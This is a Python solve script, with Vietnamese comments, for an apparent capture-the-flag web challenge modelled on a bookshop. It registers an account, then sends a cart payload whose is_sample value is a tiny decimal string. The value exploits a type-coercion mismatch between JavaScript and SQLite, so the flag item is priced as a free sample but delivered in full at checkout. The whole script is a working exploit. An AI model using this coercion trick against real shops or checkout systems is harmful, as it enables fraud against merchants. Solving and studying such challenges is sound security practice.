import requests
import zipfile
import io

# URL của bài CTF (thay đổi cho đúng)
BASE_URL = "https://narnes-and-bobles-71uzt.instancer.lac.tf/" 

def solve():
    session = requests.Session()
    username = "hacker_logic_fixed"
    password = "123"

    # 1. Đăng ký tài khoản
    print("[*] Registering...")
    session.post(f"{BASE_URL}/register", data={"username": username, "password": password})
    
    # 2. Thêm Flag vào giỏ hàng
    # ID của Flag lấy từ books.json: 2a16e349fb9045fa
    # Ta dùng chuỗi số thực cực nhỏ để lừa JS và SQLite
    flag_id = "2a16e349fb9045fa"
    
    # " 0.0000000000000000000000000000000000000001" 
    # JS: +is_sample = số dương (Truthy) -> additionalSum += 0
    # SQLite: Lưu vào cột INT -> 0
    payload = {
        "products": [
            {
                "book_id": flag_id, 
                "is_sample": " 0.0000000000000000000000000000000000000001"
            }
        ]
    }

    print("[*] Adding flag with type coercion payload...")
    res = session.post(f"{BASE_URL}/cart/add", json=payload)
    print(f"[*] Response: {res.text}")

    # 3. Checkout để lấy Flag thật
    print("[*] Checking out...")
    res = session.post(f"{BASE_URL}/cart/checkout")
    
    if res.headers.get('Content-Type') == 'application/zip':
        with zipfile.ZipFile(io.BytesIO(res.content)) as z:
            file_list = z.namelist()
            print(f"[+] Files in ZIP: {file_list}")
            if 'flag.txt' in file_list:
                print(f"\n[!] FLAG: {z.read('flag.txt').decode()}")
            else:
                print("[-] Received sample file. Try adding more zeros to the payload.")
    else:
        print(f"[-] Checkout failed: {res.text}")

if __name__ == "__main__":
    solve()